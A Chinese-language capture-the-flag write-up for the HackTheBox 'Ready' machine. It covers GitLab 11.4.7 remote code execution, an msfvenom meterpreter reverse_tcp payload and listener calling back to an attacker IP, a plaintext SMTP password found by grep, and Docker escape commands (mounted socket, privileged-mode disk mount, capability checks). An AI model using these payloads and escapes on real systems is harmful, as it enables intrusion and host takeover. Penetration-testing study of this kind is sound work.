---
title: "HackTheBox：Ready笔记"
slug: rnw6fb
translationKey: rnw6fb
date: 2021-05-09T01:32:13+08:00
source: yuque/penetration
---

# 入口
Nmap

```http
http://10.10.10.220:5080/users/sign_in #GitLab Community Edition 11.4.7 (RCE)


```



如何获取Gitlab版本呢？——根据[https://stackoverflow.com/questions/21068773/how-to-check-the-version-of-gitlab](https://stackoverflow.com/questions/21068773/how-to-check-the-version-of-gitlab)，可知

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620495231020-8a8b6bee-58cb-4933-be3d-3d6acee6c319.png)

注册用户、上去看到版本

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620495290026-65ad4c65-978b-4ba6-96a6-9a08f5b13172.png)

搜索之，有exp

[https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py](https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py)

顺利拿到git用户shell

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620495309511-cb1acc0f-17f4-4f5b-acdb-524fc2ef05d9.png)

---

# 提权
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620497231561-8064a60f-a9e2-4526-a794-59ae90d9b6c7.png)

```yaml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```

跟进

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620497355234-5e06361c-8767-4558-bd1a-fe909485549d.png)



```basic
λ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.16.34 lport=443 -f elf  -o r_443.elf
D:/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-core-0.1.13/lib/rex/compat.rb:376: warning: Win32API is deprecated after Ruby 1.9.1; use fiddle directly instead
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: r_443.elf
```

监听

```basic
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > set payload  linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost  10.10.16.34
lhost => 10.10.16.34
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run
```

`YG65407Bjqvv9A0a8Tm_7w`

暂无思路，，，



在`/opt`目录下，全局`grep -r -i pass`，找到以下内容

```basic
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"	
```



通过查看`/proc/1/cgroup`，确认当前环境是在docker中，那么考虑docker逃逸的方案（参考[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)）：

> `cgroups`代表“控制组”。这是一项Linux功能，原本是用于隔离资源的使用，在Docker中也起到隔离容器的功能。您可以通过检查init进程的控制组来判断您是否在容器中`/proc/1/cgroup`。
>
> （1）如果您不在容器内，则控制组应为`/`，下图中的右边
>
> （2）另一方面，如果您在容器内，则应该看到`/docker/CONTAINER_ID`，下图中的左边
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620541001268-058fb937-83f1-41bc-bfe7-255ed67ba9a2.png)

See：[https://funphishing.github.io/2021/01/17/HackTheBox-Ready/](https://funphishing.github.io/2021/01/17/HackTheBox-Ready/)



提权成功！

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620533897189-a3308d61-5e4a-4482-a6a7-7f4fc3409e9b.png)

[此处为语雀卡片，点击链接查看](https://www.yuque.com/docs/44948535#I1oA6)

---

# 反思
## 快速扫描
```basic
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.220 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

nmap -p$ports -sC -sV -oA ready 10.10.10.220
```

但是我觉得实战中，直接跑括号里的内容还实际点

```basic
nmap -p- --min-rate=1000 -T4 10.10.10.220 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//

```

## 更友好的shell
通用升级shell

```basic
script -c "/bin/bash -i" /dev/null

or

python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620501473236-53296029-163b-47ce-8d33-a093cee1315f.png)



## docker逃逸思路小结
### （1）Mounted docker socket
将docker的socket挂载到了容器中，将导致容器可以任意与机器互动

See：[https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket)

```bash
# List images to use one
docker images
# Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# 对于其它位置，使用
-H unix:///path/to/docker.sock
```

运行`docker ps`即可知

### （2）--privileged flag
> <font style="color:rgb(85, 85, 85);">应该是最经典的docker逃逸，首先需要docker以privileged模式运行当</font><font style="color:rgb(85, 85, 85);background-color:rgb(238, 238, 238);">docker run</font><font style="color:rgb(85, 85, 85);">时加上</font>`<font style="color:rgb(85, 85, 85);background-color:rgb(238, 238, 238);">--privileged</font>`<font style="color:rgb(85, 85, 85);">这个参数，会使得该容器拥有宿主机root权限，设计时最大的用途应该是允许在该容器内再开容器，</font><u><font style="color:rgb(85, 85, 85);">该类型的docker由于其权限可以看到宿主机上的磁盘等设备，且允许重新挂载目录通过</font></u><u><font style="color:rgb(85, 85, 85);background-color:rgb(238, 238, 238);">fdisk -l</font></u><u><font style="color:rgb(85, 85, 85);">命令查看磁盘文件，非</font></u>`<u><font style="color:rgb(85, 85, 85);">privileged</font></u>`<u><font style="color:rgb(85, 85, 85);">的docker将无法看到磁盘。</font></u>
>

<font style="color:rgb(85, 85, 85);">因此privileged容器最常用的逃逸方式就是</font>**<font style="color:rgb(85, 85, 85);">将宿主机的根目录挂载进容器内部</font>**<font style="color:rgb(85, 85, 85);">，对宿主机进行任意文件读写，通过修改</font>`<font style="color:rgb(85, 85, 85);">crontab</font>`<font style="color:rgb(85, 85, 85);">，root的</font>`<font style="color:rgb(85, 85, 85);">authorized_keys</font>`<font style="color:rgb(85, 85, 85);">等文件完成逃逸</font>

```basic
# 通过挂载目录命令查看磁盘文件，非privileged的docker将无法看到磁盘
fdisk -l
```

如果运行`fdisk -l`命令后有输出，则为`privileged`容器，否则为`非privileged`的docker

利用的话，也就很简单了

```basic
fdisk -l
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
cd /mnt/hola
更改文件即可。。。
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621257473874-8571db15-9812-4e15-82ef-ecd9643aa752.png)

### （3）Container Capabilities 容器权限过大
You can check currently container capabilities with:

```basic
capsh --print
```

if it has any of the following ones, you might be able to scape from it: 

**CAP_SYS_ADMIN**_,_**CAP_SYS_PTRACE**, **CAP_SYS_MODULE**, **DAC_READ_SEARCH**, **DAC_OVERRIDE**

```basic
CAP_SYS_ADMIN
CAP_SYS_PTRACE
CAP_SYS_MODULE
DAC_READ_SEARCH
DAC_OVERRIDE
```

用grep汇总成一条命令：

```basic
capsh --print|grep -iE "CAP_SYS_ADMIN|CAP_SYS_PTRACE|CAP_SYS_MODULE|DAC_READ_SEARCH|DAC_OVERRIDE"

```

如果没有输出，证明不是特权滥用的容器。

利用

首先，分析一条命令

```basic
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
```

将会打印出docker在宿主机上的物理位置，如

```basic
root@e5871b579f57:/tmp# sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab

/var/lib/docker/overlay2/cfd00f89faf865bca3f8a2090d285c93a07c50ee2076cee71be98e08022cfcf8/diff
```



---

# Refs
+ [privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
+ [Docker SYS_ADMIN 容器逃逸原理解析 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/264843.html)
+ [Docker escape](https://z3ratu1.github.io/Docker%20Escape.html)

